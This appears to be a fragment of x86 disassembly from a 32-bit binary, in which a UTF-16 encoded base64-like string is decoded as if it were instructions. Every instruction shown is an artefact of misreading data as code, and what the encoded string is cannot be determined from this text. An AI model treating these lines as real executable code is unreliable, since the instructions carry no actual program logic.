  408357:	48                   	dec    %eax
  408358:	00 48 00             	add    %cl,0x0(%eax)
  40835b:	41                   	inc    %ecx
  40835c:	00 66 00             	add    %ah,0x0(%esi)
  40835f:	79 00                	jns    0x408361
  408361:	52                   	push   %edx
  408362:	00 4a 00             	add    %cl,0x0(%edx)
  408365:	47                   	inc    %edi
  408366:	00 45 00             	add    %al,0x0(%ebp)
  408369:	4d                   	dec    %ebp
  40836a:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40836e:	00 49 00             	add    %cl,0x0(%ecx)
  408371:	39 00                	cmp    %eax,(%eax)
  408373:	35 00 35 00 57       	xor    $0x57003500,%eax
  408378:	00 34 00             	add    %dh,(%eax,%eax,1)
  40837b:	53                   	push   %ebx
  40837c:	00 36                	add    %dh,(%esi)
  40837e:	00 57 00             	add    %dl,0x0(%edi)
  408381:	4b                   	dec    %ebx
  408382:	00 4a 00             	add    %cl,0x0(%edx)
  408385:	52                   	push   %edx
  408386:	00 75 00             	add    %dh,0x0(%ebp)
  408389:	30 00                	xor    %al,(%eax)
  40838b:	47                   	inc    %edi
  40838c:	00 49 00             	add    %cl,0x0(%ecx)
  40838f:	59                   	pop    %ecx
  408390:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  408394:	00 51 00             	add    %dl,0x0(%ecx)
  408397:	33 00                	xor    (%eax),%eax
  408399:	4b                   	dec    %ebx
  40839a:	00 36                	add    %dh,(%esi)
  40839c:	00 39                	add    %bh,(%ecx)
  40839e:	00 65 00             	add    %ah,0x0(%ebp)
  4083a1:	34 00                	xor    $0x0,%al
  4083a3:	2f                   	das
  4083a4:	00 43 00             	add    %al,0x0(%ebx)
  4083a7:	59                   	pop    %ecx
  4083a8:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  4083ac:	00 53 00             	add    %dl,0x0(%ebx)
  4083af:	34 00                	xor    $0x0,%al
  4083b1:	33 00                	xor    (%eax),%eax
  4083b3:	53                   	push   %ebx
  4083b4:	00 6b 00             	add    %ch,0x0(%ebx)
  4083b7:	44                   	inc    %esp
  4083b8:	00 61 00             	add    %ah,0x0(%ecx)
  4083bb:	57                   	push   %edi
  4083bc:	00 75 00             	add    %dh,0x0(%ebp)
  4083bf:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  4083c3:	4f                   	dec    %edi
  4083c4:	00 70 00             	add    %dh,0x0(%eax)
  4083c7:	59                   	pop    %ecx
  4083c8:	00 70 00             	add    %dh,0x0(%eax)
  4083cb:	33 00                	xor    (%eax),%eax
  4083cd:	42                   	inc    %edx
  4083ce:	00 30                	add    %dh,(%eax)
  4083d0:	00 4a 00             	add    %cl,0x0(%edx)
  4083d3:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  4083d7:	7a 00                	jp     0x4083d9
  4083d9:	69 00 49 00 6b 00    	imul   $0x6b0049,(%eax),%eax
  4083df:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  4083e3:	34 00                	xor    $0x0,%al
  4083e5:	51                   	push   %ecx
  4083e6:	00 36                	add    %dh,(%esi)
  4083e8:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  4083ec:	00 31                	add    %dh,(%ecx)
  4083ee:	00 71 00             	add    %dh,0x0(%ecx)
  4083f1:	42                   	inc    %edx
  4083f2:	00 77 00             	add    %dh,0x0(%edi)
  4083f5:	45                   	inc    %ebp
  4083f6:	00 69 00             	add    %ch,0x0(%ecx)
  4083f9:	69 00 71 00 6e 00    	imul   $0x6e0071,(%eax),%eax
  4083ff:	59                   	pop    %ecx
  408400:	00 6a 00             	add    %ch,0x0(%edx)
  408403:	77 00                	ja     0x408405
  408405:	6a 00                	push   $0x0
  408407:	7a 00                	jp     0x408409
  408409:	6b 00 77             	imul   $0x77,(%eax),%eax
  40840c:	00 7a 00             	add    %bh,0x0(%edx)
  40840f:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  408413:	48                   	dec    %eax
  408414:	00 6b 00             	add    %ch,0x0(%ebx)
  408417:	73 00                	jae    0x408419
  408419:	46                   	inc    %esi
  40841a:	00 49 00             	add    %cl,0x0(%ecx)
  40841d:	77 00                	ja     0x40841f
  40841f:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  408423:	53                   	push   %ebx
  408424:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  408428:	00 57 00             	add    %dl,0x0(%edi)
  40842b:	38 00                	cmp    %al,(%eax)
  40842d:	44                   	inc    %esp
  40842e:	00 79 00             	add    %bh,0x0(%ecx)
  408431:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  408435:	63 00                	arpl   %eax,(%eax)
  408437:	37                   	aaa
  408438:	00 35 00 73 00 68    	add    %dh,0x68007300
  40843e:	00 6d 00             	add    %ch,0x0(%ebp)
  408441:	35 00 48 00 43       	xor    $0x43004800,%eax
  408446:	00 7a 00             	add    %bh,0x0(%edx)
  408449:	55                   	push   %ebp
  40844a:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40844e:	00 32                	add    %dh,(%edx)
  408450:	00 62 00             	add    %ah,0x0(%edx)
  408453:	37                   	aaa
  408454:	00 6f 00             	add    %ch,0x0(%edi)
  408457:	37                   	aaa
  408458:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40845c:	00 71 00             	add    %dh,0x0(%ecx)
  40845f:	49                   	dec    %ecx
  408460:	00 65 00             	add    %ah,0x0(%ebp)
  408463:	4c                   	dec    %esp
  408464:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  408468:	00 41 00             	add    %al,0x0(%ecx)
  40846b:	49                   	dec    %ecx
  40846c:	00 48 00             	add    %cl,0x0(%eax)
  40846f:	70 00                	jo     0x408471
  408471:	2f                   	das
  408472:	00 6b 00             	add    %ch,0x0(%ebx)
  408475:	63 00                	arpl   %eax,(%eax)
  408477:	2b 00                	sub    (%eax),%eax
  408479:	61                   	popa
  40847a:	00 75 00             	add    %dh,0x0(%ebp)
  40847d:	74 00                	je     0x40847f
  40847f:	4e                   	dec    %esi
  408480:	00 43 00             	add    %al,0x0(%ebx)
  408483:	47                   	inc    %edi
  408484:	00 69 00             	add    %ch,0x0(%ecx)
  408487:	47                   	inc    %edi
  408488:	00 51 00             	add    %dl,0x0(%ecx)
  40848b:	34 00                	xor    $0x0,%al
  40848d:	66 00 54 00 2f       	data16 add %dl,0x2f(%eax,%eax,1)
  408492:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  408496:	00 35 00 4e 00 47    	add    %dh,0x47004e00
  40849c:	00 58 00             	add    %bl,0x0(%eax)
  40849f:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4084a3:	47                   	inc    %edi
  4084a4:	00 31                	add    %dh,(%ecx)
  4084a6:	00 41 00             	add    %al,0x0(%ecx)
  4084a9:	69 00 49 00 72 00    	imul   $0x720049,(%eax),%eax
  4084af:	73 00                	jae    0x4084b1
  4084b1:	7a 00                	jp     0x4084b3
  4084b3:	79 00                	jns    0x4084b5
  4084b5:	50                   	push   %eax
  4084b6:	00 63 00             	add    %ah,0x0(%ebx)
  4084b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ba:	00 78 00             	add    %bh,0x0(%eax)
  4084bd:	70 00                	jo     0x4084bf
  4084bf:	67 00 66 00          	add    %ah,0x0(%bp)
  4084c3:	4d                   	dec    %ebp
  4084c4:	00 6d 00             	add    %ch,0x0(%ebp)
  4084c7:	2f                   	das
  4084c8:	00 48 00             	add    %cl,0x0(%eax)
  4084cb:	4e                   	dec    %esi
  4084cc:	00 77 00             	add    %dh,0x0(%edi)
  4084cf:	59                   	pop    %ecx
  4084d0:	00 30                	add    %dh,(%eax)
  4084d2:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  4084d6:	00 62 00             	add    %ah,0x0(%edx)
  4084d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4084da:	00 34 00             	add    %dh,(%eax,%eax,1)
  4084dd:	4a                   	dec    %edx
  4084de:	00 41 00             	add    %al,0x0(%ecx)
  4084e1:	53                   	push   %ebx
  4084e2:	00 51 00             	add    %dl,0x0(%ecx)
  4084e5:	37                   	aaa
  4084e6:	00 46 00             	add    %al,0x0(%esi)
  4084e9:	38 00                	cmp    %al,(%eax)
  4084eb:	4c                   	dec    %esp
  4084ec:	00 50 00             	add    %dl,0x0(%eax)
  4084ef:	79 00                	jns    0x4084f1
  4084f1:	62 00                	bound  %eax,(%eax)
  4084f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f4:	00 71 00             	add    %dh,0x0(%ecx)
  4084f7:	43                   	inc    %ebx
  4084f8:	00 5a 00             	add    %bl,0x0(%edx)
  4084fb:	6d                   	insl   (%dx),%es:(%edi)
  4084fc:	00 6a 00             	add    %ch,0x0(%edx)
  4084ff:	56                   	push   %esi
  408500:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  408504:	00 53 00             	add    %dl,0x0(%ebx)
  408507:	70 00                	jo     0x408509
  408509:	6a 00                	push   $0x0
  40850b:	5a                   	pop    %edx
  40850c:	00 37                	add    %dh,(%edi)
  40850e:	00 2f                	add    %ch,(%edi)
  408510:	00 4e 00             	add    %cl,0x0(%esi)
  408513:	6f                   	outsl  %ds:(%esi),(%dx)
  408514:	00 77 00             	add    %dh,0x0(%edi)
  408517:	34 00                	xor    $0x0,%al
  408519:	33 00                	xor    (%eax),%eax
  40851b:	72 00                	jb     0x40851d
  40851d:	67 00 37             	add    %dh,(%bx)
  408520:	00 51 00             	add    %dl,0x0(%ecx)
  408523:	43                   	inc    %ebx
  408524:	00 62 00             	add    %ah,0x0(%edx)
  408527:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40852a:	00 33                	add    %dh,(%ebx)
  40852c:	00 4e 00             	add    %cl,0x0(%esi)
  40852f:	6b 00 32             	imul   $0x32,(%eax),%eax
  408532:	00 52 00             	add    %dl,0x0(%edx)
  408535:	63 00                	arpl   %eax,(%eax)
  408537:	47                   	inc    %edi
  408538:	00 46 00             	add    %al,0x0(%esi)
  40853b:	44                   	inc    %esp
  40853c:	00 41 00             	add    %al,0x0(%ecx)
  40853f:	76 00                	jbe    0x408541
  408541:	6d                   	insl   (%dx),%es:(%edi)
  408542:	00 78 00             	add    %bh,0x0(%eax)
  408545:	39 00                	cmp    %eax,(%eax)
  408547:	68 00 55 00 68       	push   $0x68005500
  40854c:	00 5a 00             	add    %bl,0x0(%edx)
  40854f:	74 00                	je     0x408551
  408551:	43                   	inc    %ebx
  408552:	00 59 00             	add    %bl,0x0(%ecx)
  408555:	4a                   	dec    %edx
  408556:	00 78 00             	add    %bh,0x0(%eax)
  408559:	45                   	inc    %ebp
  40855a:	00 42 00             	add    %al,0x0(%edx)
  40855d:	71 00                	jno    0x40855f
  40855f:	7a 00                	jp     0x408561
  408561:	59                   	pop    %ecx
  408562:	00 63 00             	add    %ah,0x0(%ebx)
  408565:	31 00                	xor    %eax,(%eax)
  408567:	38 00                	cmp    %al,(%eax)
  408569:	2f                   	das
  40856a:	00 36                	add    %dh,(%esi)
  40856c:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  408570:	00 51 00             	add    %dl,0x0(%ecx)
  408573:	4d                   	dec    %ebp
  408574:	00 68 00             	add    %ch,0x0(%eax)
  408577:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40857a:	00 77 00             	add    %dh,0x0(%edi)
  40857d:	63 00                	arpl   %eax,(%eax)
  40857f:	44                   	inc    %esp
  408580:	00 71 00             	add    %dh,0x0(%ecx)
  408583:	2b 00                	sub    (%eax),%eax
  408585:	56                   	push   %esi
  408586:	00 32                	add    %dh,(%edx)
  408588:	00 66 00             	add    %ah,0x0(%esi)
  40858b:	6e                   	outsb  %ds:(%esi),(%dx)
  40858c:	00 42 00             	add    %al,0x0(%edx)
  40858f:	70 00                	jo     0x408591
  408591:	47                   	inc    %edi
  408592:	00 79 00             	add    %bh,0x0(%ecx)
  408595:	4e                   	dec    %esi
  408596:	00 78 00             	add    %bh,0x0(%eax)
  408599:	72 00                	jb     0x40859b
  40859b:	48                   	dec    %eax
  40859c:	00 6f 00             	add    %ch,0x0(%edi)
  40859f:	47                   	inc    %edi
  4085a0:	00 59 00             	add    %bl,0x0(%ecx)
  4085a3:	46                   	inc    %esi
  4085a4:	00 62 00             	add    %ah,0x0(%edx)
  4085a7:	77 00                	ja     0x4085a9
  4085a9:	57                   	push   %edi
  4085aa:	00 6a 00             	add    %ch,0x0(%edx)
  4085ad:	44                   	inc    %esp
  4085ae:	00 7a 00             	add    %bh,0x0(%edx)
  4085b1:	70 00                	jo     0x4085b3
  4085b3:	34 00                	xor    $0x0,%al
  4085b5:	68 00 42 00 41       	push   $0x41004200
  4085ba:	00 72 00             	add    %dh,0x0(%edx)
  4085bd:	30 00                	xor    %al,(%eax)
  4085bf:	43                   	inc    %ebx
  4085c0:	00 4d 00             	add    %cl,0x0(%ebp)
  4085c3:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  4085c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c8:	00 72 00             	add    %dh,0x0(%edx)
  4085cb:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  4085cf:	4e                   	dec    %esi
  4085d0:	00 2b                	add    %ch,(%ebx)
  4085d2:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  4085d6:	00 46 00             	add    %al,0x0(%esi)
  4085d9:	58                   	pop    %eax
  4085da:	00 6e 00             	add    %ch,0x0(%esi)
  4085dd:	59                   	pop    %ecx
  4085de:	00 53 00             	add    %dl,0x0(%ebx)
  4085e1:	57                   	push   %edi
  4085e2:	00 39                	add    %bh,(%ecx)
  4085e4:	00 71 00             	add    %dh,0x0(%ecx)
  4085e7:	43                   	inc    %ebx
  4085e8:	00 75 00             	add    %dh,0x0(%ebp)
  4085eb:	37                   	aaa
  4085ec:	00 53 00             	add    %dl,0x0(%ebx)
  4085ef:	4f                   	dec    %edi
  4085f0:	00 5a 00             	add    %bl,0x0(%edx)
  4085f3:	67 00 65 00          	add    %ah,0x0(%di)
  4085f7:	33 00                	xor    (%eax),%eax
  4085f9:	35 00 38 00 65       	xor    $0x65003800,%eax
  4085fe:	00 78 00             	add    %bh,0x0(%eax)
  408601:	6d                   	insl   (%dx),%es:(%edi)
  408602:	00 58 00             	add    %bl,0x0(%eax)
  408605:	68 00 55 00 4c       	push   $0x4c005500
  40860a:	00 6f 00             	add    %ch,0x0(%edi)
  40860d:	69 00 79 00 7a 00    	imul   $0x7a0079,(%eax),%eax
  408613:	62 00                	bound  %eax,(%eax)
  408615:	4e                   	dec    %esi
  408616:	00 72 00             	add    %dh,0x0(%edx)
  408619:	44                   	inc    %esp
  40861a:	00 41 00             	add    %al,0x0(%ecx)
  40861d:	37                   	aaa
  40861e:	00 48 00             	add    %cl,0x0(%eax)
  408621:	2f                   	das
  408622:	00 55 00             	add    %dl,0x0(%ebp)
  408625:	75 00                	jne    0x408627
  408627:	35 00 73 00 56       	xor    $0x56007300,%eax
  40862c:	00 66 00             	add    %ah,0x0(%esi)
  40862f:	48                   	dec    %eax
  408630:	00 66 00             	add    %ah,0x0(%esi)
  408633:	39 00                	cmp    %eax,(%eax)
  408635:	53                   	push   %ebx
  408636:	00 4b 00             	add    %cl,0x0(%ebx)
  408639:	44                   	inc    %esp
  40863a:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40863e:	00 34 00             	add    %dh,(%eax,%eax,1)
  408641:	47                   	inc    %edi
  408642:	00 37                	add    %dh,(%edi)
  408644:	00 4b 00             	add    %cl,0x0(%ebx)
  408647:	33 00                	xor    (%eax),%eax
  408649:	39 00                	cmp    %eax,(%eax)
  40864b:	52                   	push   %edx
  40864c:	00 67 00             	add    %ah,0x0(%edi)
  40864f:	55                   	push   %ebp
  408650:	00 78 00             	add    %bh,0x0(%eax)
  408653:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  408659:	78 00                	js     0x40865b
  40865b:	6b 00 42             	imul   $0x42,(%eax),%eax
  40865e:	00 70 00             	add    %dh,0x0(%eax)
  408661:	31 00                	xor    %eax,(%eax)
  408663:	49                   	dec    %ecx
  408664:	00 4d 00             	add    %cl,0x0(%ebp)
  408667:	53                   	push   %ebx
  408668:	00 6e 00             	add    %ch,0x0(%esi)
  40866b:	73 00                	jae    0x40866d
  40866d:	4a                   	dec    %edx
  40866e:	00 79 00             	add    %bh,0x0(%ecx)
  408671:	69 00 78 00 71 00    	imul   $0x710078,(%eax),%eax
  408677:	48                   	dec    %eax
  408678:	00 73 00             	add    %dh,0x0(%ebx)
  40867b:	6c                   	insb   (%dx),%es:(%edi)
  40867c:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  408680:	00 6b 00             	add    %ch,0x0(%ebx)
  408683:	37                   	aaa
  408684:	00 49 00             	add    %cl,0x0(%ecx)
  408687:	31 00                	xor    %eax,(%eax)
  408689:	69 00 34 00 7a 00    	imul   $0x7a0034,(%eax),%eax
  40868f:	76 00                	jbe    0x408691
  408691:	6a 00                	push   $0x0
  408693:	4c                   	dec    %esp
  408694:	00 69 00             	add    %ch,0x0(%ecx)
  408697:	30 00                	xor    %al,(%eax)
  408699:	50                   	push   %eax
  40869a:	00 43 00             	add    %al,0x0(%ebx)
  40869d:	44                   	inc    %esp
  40869e:	00 7a 00             	add    %bh,0x0(%edx)
  4086a1:	51                   	push   %ecx
  4086a2:	00 79 00             	add    %bh,0x0(%ecx)
  4086a5:	37                   	aaa
  4086a6:	00 36                	add    %dh,(%esi)
  4086a8:	00 46 00             	add    %al,0x0(%esi)
  4086ab:	57                   	push   %edi
  4086ac:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  4086b0:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  4086b4:	00 55 00             	add    %dl,0x0(%ebp)
  4086b7:	75 00                	jne    0x4086b9
  4086b9:	6a 00                	push   $0x0
  4086bb:	58                   	pop    %eax
  4086bc:	00 7a 00             	add    %bh,0x0(%edx)
  4086bf:	7a 00                	jp     0x4086c1
  4086c1:	46                   	inc    %esi
  4086c2:	00 35 00 4d 00 47    	add    %dh,0x47004d00
  4086c8:	00 37                	add    %dh,(%edi)
  4086ca:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4086ce:	00 7a 00             	add    %bh,0x0(%edx)
  4086d1:	57                   	push   %edi
  4086d2:	00 48 00             	add    %cl,0x0(%eax)
  4086d5:	79 00                	jns    0x4086d7
  4086d7:	4d                   	dec    %ebp
  4086d8:	00 68 00             	add    %ch,0x0(%eax)
  4086db:	30 00                	xor    %al,(%eax)
  4086dd:	37                   	aaa
  4086de:	00 41 00             	add    %al,0x0(%ecx)
  4086e1:	4e                   	dec    %esi
  4086e2:	00 71 00             	add    %dh,0x0(%ecx)
  4086e5:	6c                   	insb   (%dx),%es:(%edi)
  4086e6:	00 4a 00             	add    %cl,0x0(%edx)
  4086e9:	74 00                	je     0x4086eb
  4086eb:	53                   	push   %ebx
  4086ec:	00 69 00             	add    %ch,0x0(%ecx)
  4086ef:	4e                   	dec    %esi
  4086f0:	00 4a 00             	add    %cl,0x0(%edx)
  4086f3:	70 00                	jo     0x4086f5
  4086f5:	57                   	push   %edi
  4086f6:	00 6b 00             	add    %ch,0x0(%ebx)
  4086f9:	78 00                	js     0x4086fb
  4086fb:	4a                   	dec    %edx
  4086fc:	00 6e 00             	add    %ch,0x0(%esi)
  4086ff:	58                   	pop    %eax
  408700:	00 6f 00             	add    %ch,0x0(%edi)
  408703:	37                   	aaa
  408704:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  408708:	00 6a 00             	add    %ch,0x0(%edx)
  40870b:	44                   	inc    %esp
  40870c:	00 70 00             	add    %dh,0x0(%eax)
  40870f:	67 00 67 00          	add    %ah,0x0(%bx)
  408713:	41                   	inc    %ecx
  408714:	00 71 00             	add    %dh,0x0(%ecx)
  408717:	34 00                	xor    $0x0,%al
  408719:	4a                   	dec    %edx
  40871a:	00 77 00             	add    %dh,0x0(%edi)
  40871d:	7a 00                	jp     0x40871f
  40871f:	61                   	popa
  408720:	00 75 00             	add    %dh,0x0(%ebp)
  408723:	51                   	push   %ecx
  408724:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  408728:	00 62 00             	add    %ah,0x0(%edx)
  40872b:	49                   	dec    %ecx
  40872c:	00 46 00             	add    %al,0x0(%esi)
  40872f:	4f                   	dec    %edi
  408730:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  408734:	00 2f                	add    %ch,(%edi)
  408736:	00 2b                	add    %ch,(%ebx)
  408738:	00 35 00 77 00 71    	add    %dh,0x71007700
  40873e:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  408742:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  408746:	00 4b 00             	add    %cl,0x0(%ebx)
  408749:	7a 00                	jp     0x40874b
  40874b:	6b 00 52             	imul   $0x52,(%eax),%eax
  40874e:	00 6a 00             	add    %ch,0x0(%edx)
  408751:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  408755:	57                   	push   %edi
  408756:	00 4d 00             	add    %cl,0x0(%ebp)
  408759:	4f                   	dec    %edi
  40875a:	00 47 00             	add    %al,0x0(%edi)
  40875d:	59                   	pop    %ecx
  40875e:	00 2b                	add    %ch,(%ebx)
  408760:	00 75 00             	add    %dh,0x0(%ebp)
  408763:	6f                   	outsl  %ds:(%esi),(%dx)
  408764:	00 55 00             	add    %dl,0x0(%ebp)
  408767:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40876b:	51                   	push   %ecx
  40876c:	00 2f                	add    %ch,(%edi)
  40876e:	00 62 00             	add    %ah,0x0(%edx)
  408771:	63 00                	arpl   %eax,(%eax)
  408773:	37                   	aaa
  408774:	00 45 00             	add    %al,0x0(%ebp)
  408777:	45                   	inc    %ebp
  408778:	00 35 00 64 00 44    	add    %dh,0x44006400
  40877e:	00 65 00             	add    %ah,0x0(%ebp)
  408781:	42                   	inc    %edx
  408782:	00 53 00             	add    %dl,0x0(%ebx)
  408785:	79 00                	jns    0x408787
  408787:	68 00 44 00 7a       	push   $0x7a004400
  40878c:	00 7a 00             	add    %bh,0x0(%edx)
  40878f:	2f                   	das
  408790:	00 41 00             	add    %al,0x0(%ecx)
  408793:	4a                   	dec    %edx
  408794:	00 30                	add    %dh,(%eax)
  408796:	00 32                	add    %dh,(%edx)
  408798:	00 79 00             	add    %bh,0x0(%ecx)
  40879b:	68 00 32 00 78       	push   $0x78003200
  4087a0:	00 78 00             	add    %bh,0x0(%eax)
  4087a3:	42                   	inc    %edx
  4087a4:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  4087a8:	00 61 00             	add    %ah,0x0(%ecx)
  4087ab:	49                   	dec    %ecx
  4087ac:	00 43 00             	add    %al,0x0(%ebx)
  4087af:	30 00                	xor    %al,(%eax)
  4087b1:	34 00                	xor    $0x0,%al
  4087b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b4:	00 49 00             	add    %cl,0x0(%ecx)
  4087b7:	6b 00 67             	imul   $0x67,(%eax),%eax
  4087ba:	00 30                	add    %dh,(%eax)
  4087bc:	00 38                	add    %bh,(%eax)
  4087be:	00 68 00             	add    %ch,0x0(%eax)
  4087c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4087c5:	54                   	push   %esp
  4087c6:	00 43 00             	add    %al,0x0(%ebx)
  4087c9:	47                   	inc    %edi
  4087ca:	00 43 00             	add    %al,0x0(%ebx)
  4087cd:	2b 00                	sub    (%eax),%eax
  4087cf:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  4087d3:	55                   	push   %ebp
  4087d4:	00 43 00             	add    %al,0x0(%ebx)
  4087d7:	68 00 54 00 4b       	push   $0x4b005400
  4087dc:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  4087e0:	00 6a 00             	add    %ch,0x0(%edx)
  4087e3:	4c                   	dec    %esp
  4087e4:	00 6d 00             	add    %ch,0x0(%ebp)
  4087e7:	53                   	push   %ebx
  4087e8:	00 4d 00             	add    %cl,0x0(%ebp)
  4087eb:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  4087ef:	4f                   	dec    %edi
  4087f0:	00 4b 00             	add    %cl,0x0(%ebx)
  4087f3:	2b 00                	sub    (%eax),%eax
  4087f5:	4f                   	dec    %edi
  4087f6:	00 5a 00             	add    %bl,0x0(%edx)
  4087f9:	76 00                	jbe    0x4087fb
  4087fb:	55                   	push   %ebp
  4087fc:	00 2b                	add    %ch,(%ebx)
  4087fe:	00 34 00             	add    %dh,(%eax,%eax,1)
  408801:	59                   	pop    %ecx
  408802:	00 71 00             	add    %dh,0x0(%ecx)
  408805:	49                   	dec    %ecx
  408806:	00 45 00             	add    %al,0x0(%ebp)
  408809:	4e                   	dec    %esi
  40880a:	00 77 00             	add    %dh,0x0(%edi)
  40880d:	50                   	push   %eax
  40880e:	00 59 00             	add    %bl,0x0(%ecx)
  408811:	48                   	dec    %eax
  408812:	00 5a 00             	add    %bl,0x0(%edx)
  408815:	62 00                	bound  %eax,(%eax)
  408817:	6f                   	outsl  %ds:(%esi),(%dx)
  408818:	00 67 00             	add    %ah,0x0(%edi)
  40881b:	41                   	inc    %ecx
  40881c:	00 36                	add    %dh,(%esi)
  40881e:	00 61 00             	add    %ah,0x0(%ecx)
  408821:	2b 00                	sub    (%eax),%eax
  408823:	51                   	push   %ecx
  408824:	00 37                	add    %dh,(%edi)
  408826:	00 66 00             	add    %ah,0x0(%esi)
  408829:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40882d:	71 00                	jno    0x40882f
  40882f:	43                   	inc    %ebx
  408830:	00 56 00             	add    %dl,0x0(%esi)
  408833:	4d                   	dec    %ebp
  408834:	00 65 00             	add    %ah,0x0(%ebp)
  408837:	44                   	inc    %esp
  408838:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40883c:	00 70 00             	add    %dh,0x0(%eax)
  40883f:	70 00                	jo     0x408841
  408841:	68 00 53 00 61       	push   $0x61005300
  408846:	00 4f 00             	add    %cl,0x0(%edi)
  408849:	70 00                	jo     0x40884b
  40884b:	5a                   	pop    %edx
  40884c:	00 52 00             	add    %dl,0x0(%edx)
  40884f:	79 00                	jns    0x408851
  408851:	70 00                	jo     0x408853
  408853:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  408857:	2b 00                	sub    (%eax),%eax
  408859:	75 00                	jne    0x40885b
  40885b:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40885f:	55                   	push   %ebp
  408860:	00 79 00             	add    %bh,0x0(%ecx)
  408863:	51                   	push   %ecx
  408864:	00 47 00             	add    %al,0x0(%edi)
  408867:	41                   	inc    %ecx
  408868:	00 6b 00             	add    %ch,0x0(%ebx)
  40886b:	61                   	popa
  40886c:	00 6b 00             	add    %ch,0x0(%ebx)
  40886f:	6c                   	insb   (%dx),%es:(%edi)
  408870:	00 6a 00             	add    %ch,0x0(%edx)
  408873:	6f                   	outsl  %ds:(%esi),(%dx)
  408874:	00 59 00             	add    %bl,0x0(%ecx)
  408877:	62 00                	bound  %eax,(%eax)
  408879:	53                   	push   %ebx
  40887a:	00 79 00             	add    %bh,0x0(%ecx)
  40887d:	50                   	push   %eax
  40887e:	00 33                	add    %dh,(%ebx)
  408880:	00 51 00             	add    %dl,0x0(%ecx)
  408883:	61                   	popa
  408884:	00 6e 00             	add    %ch,0x0(%esi)
  408887:	6d                   	insl   (%dx),%es:(%edi)
  408888:	00 46 00             	add    %al,0x0(%esi)
  40888b:	37                   	aaa
  40888c:	00 45 00             	add    %al,0x0(%ebp)
  40888f:	45                   	inc    %ebp
  408890:	00 43 00             	add    %al,0x0(%ebx)
  408893:	76 00                	jbe    0x408895
  408895:	62 00                	bound  %eax,(%eax)
  408897:	57                   	push   %edi
  408898:	00 62 00             	add    %ah,0x0(%edx)
  40889b:	6a 00                	push   $0x0
  40889d:	31 00                	xor    %eax,(%eax)
  40889f:	5a                   	pop    %edx
  4088a0:	00 6a 00             	add    %ch,0x0(%edx)
  4088a3:	53                   	push   %ebx
  4088a4:	00 43 00             	add    %al,0x0(%ebx)
  4088a7:	43                   	inc    %ebx
  4088a8:	00 4f 00             	add    %cl,0x0(%edi)
  4088ab:	4f                   	dec    %edi
  4088ac:	00 67 00             	add    %ah,0x0(%edi)
  4088af:	6c                   	insb   (%dx),%es:(%edi)
  4088b0:	00 31                	add    %dh,(%ecx)
  4088b2:	00 32                	add    %dh,(%edx)
  4088b4:	00 76 00             	add    %dh,0x0(%esi)
  4088b7:	79 00                	jns    0x4088b9
  4088b9:	48                   	dec    %eax
  4088ba:	00 6e 00             	add    %ch,0x0(%esi)
  4088bd:	4e                   	dec    %esi
  4088be:	00 61 00             	add    %ah,0x0(%ecx)
  4088c1:	51                   	push   %ecx
  4088c2:	00 72 00             	add    %dh,0x0(%edx)
  4088c5:	31 00                	xor    %eax,(%eax)
  4088c7:	77 00                	ja     0x4088c9
  4088c9:	54                   	push   %esp
  4088ca:	00 36                	add    %dh,(%esi)
  4088cc:	00 33                	add    %dh,(%ebx)
  4088ce:	00 50 00             	add    %dl,0x0(%eax)
  4088d1:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  4088d5:	77 00                	ja     0x4088d7
  4088d7:	36 00 4c 00 6a       	add    %cl,%ss:0x6a(%eax,%eax,1)
  4088dc:	00 53 00             	add    %dl,0x0(%ebx)
  4088df:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  4088e3:	79 00                	jns    0x4088e5
  4088e5:	41                   	inc    %ecx
